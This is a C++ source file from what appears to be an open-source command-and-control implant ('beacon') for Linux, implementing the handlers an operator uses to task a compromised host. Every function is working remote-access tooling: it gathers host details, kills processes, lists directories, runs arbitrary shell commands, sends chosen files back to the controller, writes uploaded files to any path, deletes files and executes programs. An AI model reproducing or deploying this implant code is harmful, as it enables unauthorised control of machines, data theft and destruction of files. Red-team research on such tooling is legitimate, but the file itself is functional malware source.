/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "yasio/xxsocket.hpp"
#include "cmdexec.h"
#include "beacon/beacon.h"
#include "../base/inx/inxutil.h"
#include <dirent.h>
#include <sys/stat.h>
#include <fstream>

bool exec::format_error_msg(const int msg_id, c2::TaskData& task, std::vector<char>& msg_rsp)
{
	const int len = 128;
	char buf[len];
	auto error_msg = strerror_r(errno, buf, len);
	return format_error_msg(msg_id, error_msg, task, msg_rsp);
}


bool exec::format_error_msg(const int msg_id, std::string error, c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::ErrorRsp error_rsp;
	error_rsp.set_error(error);
	error_rsp.set_msg_id(msg_id);

	std::vector<char> error_data(error_rsp.ByteSizeLong());
	error_rsp.SerializeToArray(error_data.data(), error_data.size());

	task.set_msg_id(c2::ERROR_RSP);
	task.set_rsp_flag(false);
	task.set_byte_value(error_data.data(), error_data.size());

	msg_rsp.resize(task.ByteSizeLong());
	task.SerializePartialToArray(msg_rsp.data(), msg_rsp.size());
	return false;
}

bool exec::set_rsp_data(const int msg_id, c2::TaskData& task, const std::vector<char>& data, std::vector<char>& msg_rsp)
{
	task.set_byte_value(data.data(), data.size());
	task.set_rsp_flag(true);
	task.set_msg_id(msg_id);

	msg_rsp.resize(task.ByteSizeLong());
	if (!task.SerializePartialToArray(msg_rsp.data(), msg_rsp.size()))
		return false;

	return true;
}

bool exec::get_host_info(std::vector<char>& host_data)
{
	c2::MapValueData host_info;

	std::string innet_addr;
	xxsocket::traverse_local_address([&](const ip::endpoint& ep) -> bool {
		innet_addr = ep.to_string();
		return true;
	});

	host_info.mutable_dict_value()->insert({ "group", beacon::get_group() });

	host_info.mutable_dict_value()->insert({ "arch", "linux" });
	host_info.mutable_dict_value()->insert({ "innet_ip", innet_addr });

	host_data.resize(host_info.ByteSizeLong());
	host_info.SerializeToArray(host_data.data(), host_data.size());

	return true;
}

bool exec::task_get_host_info(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	std::vector<char> host_data;
	get_host_info(host_data);

	return set_rsp_data(c2::HOST_INFO_RSP, task, host_data, msg_rsp);
}

bool exec::task_kill_process(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::IntParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
		return format_error_msg(c2::PROCESS_KILL, "error parse param", task, msg_rsp);

	if (kill(param.param(), SIGKILL) != 0)
		return format_error_msg(c2::PROCESS_KILL, task, msg_rsp);

	return task_get_process_list(task, msg_rsp);
}

bool exec::task_get_process_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	return false;
}
bool exec::task_get_disk_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::DiskListData data;
	auto driverss = data.add_drivers();
	driverss->append("/");

	std::vector<char> disklist_data(data.ByteSizeLong());
	data.SerializeToArray(disklist_data.data(), disklist_data.size());

	return set_rsp_data(c2::DISK_LIST, task, disklist_data, msg_rsp);
}

bool exec::task_get_file_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::FILE_LIST, "error parse param", task, msg_rsp);
	}

	std::string dir_path = param.param();

	DIR *dir = nullptr;
	if (!(dir = opendir(dir_path.c_str())))
		return  format_error_msg(c2::FILE_LIST, task, msg_rsp);

	c2::FileListData file_list;
	struct dirent* dir_item = nullptr;
	struct stat statbuf;
	while ((dir_item = readdir(dir)) != nullptr)
	{
		if (strcmp(dir_item->d_name, ".") != 0 && strcmp(dir_item->d_name, "..") != 0)
		{
			auto full_path = dir_path + "/" + dir_item->d_name;
			lstat(full_path.c_str(), &statbuf);

			auto item = file_list.add_files();

			item->set_file_name(dir_item->d_name);
			item->set_file_size(statbuf.st_size);
			item->set_modify_unix_tm(statbuf.st_mtime);
			item->set_is_dir(dir_item->d_type == DT_DIR);
		}
	}
	closedir(dir);
	file_list.set_parent_dir(dir_path);

	std::vector<char> filelist_data(file_list.ByteSizeLong());
	file_list.SerializeToArray(filelist_data.data(), filelist_data.size());

	return set_rsp_data(c2::FILE_LIST, task, filelist_data, msg_rsp);
}

bool exec::task_get_cmd_rsp(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::CMDPARAM param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::CMD_COMMAND, "error parse param", task, msg_rsp);
	}

	std::string cmd_out;
	if (!inx::execute_cmd(param.cmd(), param.current_dir(), cmd_out))
		return format_error_msg(c2::CMD_COMMAND, task, msg_rsp);

	c2::StrParam cmd_rsp;
	cmd_rsp.set_param(cmd_out);

	std::vector<char> data(cmd_rsp.ByteSizeLong());
	cmd_rsp.SerializeToArray(data.data(), data.size());
	return set_rsp_data(c2::CMD_COMMAND, task, data, msg_rsp);
}

bool exec::task_download_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DOWNLOAD_FILE, "error parse param", task, msg_rsp);
	}

	std::ifstream file;
	file.open(param.param(), std::ofstream::binary);
	if (file.fail())
		return format_error_msg(c2::DOWNLOAD_FILE, task, msg_rsp);

	file.seekg(0, std::ios::end);
	auto size = file.tellg();
	file.seekg(0, std::ios::beg);
	if (!size) {
		file.close();
		return format_error_msg(c2::DOWNLOAD_FILE, "file size zero", task, msg_rsp);
	}

	std::vector<char> file_data(size);
	file.read(file_data.data(), size);
	file.close();

	c2::DownLoadFile download;
	download.set_file_path(param.param());
	download.set_file_data(file_data.data(), file_data.size());

	std::vector<char> data(download.ByteSizeLong());
	download.SerializeToArray(data.data(), data.size());

	return set_rsp_data(c2::DOWNLOAD_FILE, task, data, msg_rsp);
}

bool exec::task_upload_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::UploadFile upload_data;
	if (!upload_data.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::UPLOAD_FILE, "error parse param", task, msg_rsp);
	}

	std::string path = upload_data.upload_dir() + "/" + upload_data.file_name();
	std::ofstream file;
	file.open(path, std::ofstream::binary);
	if (file.fail())
		return format_error_msg(c2::UPLOAD_FILE, task, msg_rsp);

	file.write(upload_data.file_data().data(), upload_data.file_data().size());
	file.close();

	return true;
}

bool exec::task_delete_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DELETE_FILE, "error parse param", task, msg_rsp);
	}

	if (remove(param.param().c_str()) != 0)
		return format_error_msg(c2::DELETE_FILE, task, msg_rsp);

	return true;
}

bool exec::task_exec_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DELETE_FILE, "error parse param", task, msg_rsp);
	}

	if (system(param.param().c_str()) < 0)
		return format_error_msg(c2::EXEC_FILE, task, msg_rsp);

	return task_get_process_list(task, msg_rsp);
}